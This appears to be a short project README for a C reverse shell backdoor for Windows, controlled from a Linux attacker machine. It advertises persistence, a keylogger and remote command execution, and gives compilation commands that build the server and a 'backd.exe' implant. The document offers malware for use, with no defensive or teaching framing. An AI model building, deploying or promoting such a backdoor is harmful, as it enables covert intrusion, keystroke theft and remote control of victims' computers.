# C_ReverseShell
Reverse shell coded in C for windows.
Controlled by attacker on linux machine.

Features:
  - [x] Persistency
  - [x] Keylogger
  - [x] Executing windows commands

Compilation commands:
  ```
    gcc server.c -o server
    i686-w64-mingw32-gcc -o backd.exe backdoor.c -lwininet -lwsock32
  ```
